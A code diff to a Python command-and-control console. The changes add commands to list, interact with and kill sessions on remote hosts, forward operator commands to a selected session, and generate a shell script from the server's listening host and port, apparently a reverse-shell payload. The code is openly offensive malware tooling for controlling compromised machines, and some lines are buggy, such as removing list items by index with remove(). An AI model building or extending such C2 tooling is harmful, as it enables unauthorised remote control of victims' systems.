@@ -1,27 +1,51 @@
-import Server
+import argparse, sys, shlex
 import ScriptMaker
-import argparse
-import shlex
 
 class HandlerPrompt:
-    def __init__(self, ms: Server.ServerConfig):
+    def __init__(self, ms):
         self.history = []
         self.promptType = 0
         self.malserver = ms
-        self.isess = None
+        self.isess = None # data-type: Session
+        self.inputStr = "C2 > "
 
     def PromptType(self, pt: int):
         if pt == -1 :
             return self.promptType
         self.promptType = pt
 
-def ProcessCommand(handle:HandlerPrompt):
+    def DisplaySessions(self):
+        id = 0
+        print("======= Sessions =======")
+        for sess in self.malserver.GetSessions():
+            print(f"{id} | {sess.GetSessionData().GetAddress()}")
+            id = id + 1
+        print("========================")
+
+    # Custom stdout writer to not overwrite stdin
+    def WriteToTerminal(self, recvStr: str):
+        # Dont write incoming connections to the screen
+        # while interacting with a session
+        if self.PromptType(-1) == 1:
+            return None
+        
+        # Clear the current input line
+        sys.stdout.write("\033[2K\r")  # Clear line and move cursor to start
+        sys.stdout.flush()
+
+        # Print the received message
+        print(recvStr)
+        
+        # Reprint the input prompt at the bottom
+        sys.stdout.write(self.inputStr)
+        sys.stdout.flush()
+
+def ProcessCommand(handle: HandlerPrompt):
     MalServerActive = True
     cmd = ""
-    inputStr = "C2 > "
 
     while (MalServerActive):
-        cmd = str(input(inputStr))
+        cmd = str(input(handle.inputStr))
         cmd_args = shlex.split(cmd)  # Properly split the string into arguments
 
         if cmd.lower() == "exit":
@@ -32,7 +56,7 @@ def ProcessCommand(handle:HandlerPrompt):
             else:
                 # Exit Session Prompt and Shift to C2 Prompt
                 handle.PromptType(0)
-                inputStr = "C2 > "
+                handle.inputStr = "C2 > "
         else:
             # Process the Command based on Prompt Type
             if handle.PromptType(-1) == 0:
@@ -40,6 +64,7 @@ def ProcessCommand(handle:HandlerPrompt):
                     if "script" not in cmd.lower():
                         # Default C2 Prompt
                         parser = argparse.ArgumentParser()
+                        parser.add_argument('-s', "--sessions", action='store_true', help="")
                         parser.add_argument("-i", "--interact", type=int, help="")
                         parser.add_argument("-k", "--kill", type=int, help="")
                         parser.add_argument('-K', "--kill-all", action='store_true', help="")
@@ -51,28 +76,41 @@ def ProcessCommand(handle:HandlerPrompt):
                             handle.malserver.KillSessions()
                         else:
                             if args.interact is not None:
-                                print("[*] Attempting to Interact with SessionID: {args.interact}")
+                                print(f"[*] Attempting to Interact with SessionID: {args.interact}")
 
-                                # Set session to interact with
-                                handle.isess = handle.malserver.GetSessions()[args.interact]
+                                if args.interact < len(handle.malserver.GetSessions()):
+                                    # Set session to interact with
+                                    handle.isess = handle.malserver.GetSessions()[args.interact]
 
-                                # Enter Interactive Session
-                                handle.PromptType(1)
+                                    if len(handle.isess.TestConnection()) > 0:
+                                        # Enter Interactive Session
+                                        handle.inputStr = ""
+                                        handle.isess.SendCommand()
+                                        handle.PromptType(1)
+                                    else:
+                                        print(f"[-] Session | {handle.isess.GetSessionData().GetAddress()} | has Died!")
+                                        handle.malserver.GetSessions().remove(args.interact)
+                                else:
+                                    handle.DisplaySessions()
+                            elif args.sessions:
+                                handle.DisplaySessions()
                             elif args.kill is not None:
                                 print("[*] Attempting to Kill SessionID: {args.kill}")
-                                handle.isess = handle.malserver.GetSessions().remove(args.kill)
-                                inputStr = "C2 > "
+                                handle.malserver.GetSessions().remove(args.kill)
+                                handle.inputStr = "C2 > "
                     else:
                         # Create a shell script based off malserver details
                         handle.PromptType(1)
-                        inputStr = "Script > "
+                        handle.inputStr = "Script > "
                 except SystemExit:
                     continue
 
             elif handle.PromptType(-1) == 1:
                 # Captured Session Prompt : inputStr based on
                 # recv buffer from client session selected
-                inputStr = ""
+                # meaning the input() will not have text contained
+                handle.inputStr = ""
+                handle.isess.SendCommand(cmd)
             elif handle.PromptType(-1) == 2:
                 # Create a shell script based off malserver details
                 ScriptMaker.CreateScript(handle.malserver.GetLhost(),handle.malserver.GetLport())
